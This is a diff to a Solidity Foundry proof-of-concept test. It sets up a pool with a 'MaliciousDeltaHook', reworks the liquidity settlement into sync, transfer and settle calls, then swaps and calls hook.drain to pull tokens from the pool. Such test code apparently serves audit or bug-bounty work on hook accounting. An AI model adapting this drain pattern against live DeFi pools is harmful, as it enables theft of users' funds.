@@ -35,7 +35,6 @@ contract POC is Test {
         vm.etch(a, address(new MaliciousDeltaHook(address(manager))).code);
         hook=MaliciousDeltaHook(a);
         token0.mint(address(this),100e18); token1.mint(address(this),100e18);
-        token0.mint(address(manager),100e18); token1.mint(address(manager),100e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
         hook.setCurrency1(Currency.wrap(address(token1)));
         hook.setAttacker(address(this));
@@ -47,11 +46,16 @@ contract POC is Test {
 
     function unlockCallback(bytes calldata) external returns(bytes memory){
         if(isAddingLiquidity){
-            BalanceDelta delta=manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
-            if(delta.amount0()<0) manager.settle(Currency.wrap(address(token0)));
-            if(delta.amount1()<0) manager.settle(Currency.wrap(address(token1)));
-            if(delta.amount0()>0) manager.take(Currency.wrap(address(token0)), address(this), uint128(delta.amount0()));
-            if(delta.amount1()>0) manager.take(Currency.wrap(address(token1)), address(this), uint128(delta.amount1()));
+            (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
+            // settle by sync -> transfer -> settle
+            Currency c0 = Currency.wrap(address(token0));
+            Currency c1 = Currency.wrap(address(token1));
+            manager.sync(c0);
+            token0.transfer(address(manager), 10e18);
+            manager.settle();
+            manager.sync(c1);
+            token1.transfer(address(manager), 10e18);
+            manager.settle();
         }else{
             manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
             hook.drain(10e18);
